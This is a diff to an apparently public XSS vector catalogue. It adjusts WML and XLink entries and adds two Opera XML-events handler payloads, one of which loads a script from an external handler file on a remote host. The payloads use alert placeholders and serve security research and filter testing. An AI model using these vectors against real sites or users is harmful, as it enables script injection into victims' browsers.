@@ -2171,7 +2171,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<card xmlns:x="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
+        'data'       : '<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
         'description': {
             'en' : 'Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it\'s a WML and renders it accordingly. With a timer event and a connected redirect it\'s possible to execute JavaScript without user interaction.', 
             'ja' : '',
@@ -2550,7 +2550,7 @@ var items =
             'ru' : 'Активный скриптинг с помощью XLinks',
             'de' : ''
         },
-        'data'       : '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="%js_uri_alert%" xlink:type="simple">XXX</x> ',
+        'data'       : '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="%js_uri_alert%" xlink:type="simple"/>',
         'description': {
             'en' : 'FF support the attribute "xlink:actuate" and can display xlink without additional styles and namespaces "html".',
             'ja' : '',
@@ -2627,5 +2627,70 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'wml', 'opera', 'mobile', 'timer', 'variable'],
         'reporter'   : 'LeverOne, .mario'
+    },
+    { /* ID 84 - Opera JavaScript execution via XML-events handler */
+        'id'         : 84,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Opera JavaScript execution via XML-events handler',
+            'ja' : '',
+            'ru' : 'Выполнение javascript в Opera c помощью обработчика XML-события',
+            'de' : ''
+        },
+        'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="%js_uri_alert%//#x"/>',
+        'description': {
+            'en' : 'The browser tries to load an external XML-event handler and executed javascript without user interaction.', 
+            'ja' : '',
+            'ru' : 'Браузер пытается загрузить внешний обработчик XML-события и выполняет javascript',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/xml-events/'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera': ['9.x', '10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'opera', 'event', 'handler'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 85 - Opera JavaScript execution via XML-events handler */
+        'id'         : 85,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Arbitrary payload injection in Opera via XML-events handler',
+            'ja' : '',
+            'ru' : 'Инъекция удаленного javascript-кода в Opera c помощью обработчика XML-события',
+            'de' : ''
+        },
+        'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test.evt',
+            'name'          : 'test.evt',
+            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml" id="x">%js_alert%</script>'
+        },
+        'description': {
+            'en' : 'The browser tries to load an external XML-event handler and executed javascript without user interaction.', 
+            'ja' : '',
+            'ru' : 'Браузер пытается загрузить внешний обработчик XML-события и выполняет javascript',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/xml-events/'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera': ['9.x', '10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'opera', 'event', 'handler', 'arbitrary'],
+        'reporter'   : 'LeverOne'
     }
 ]
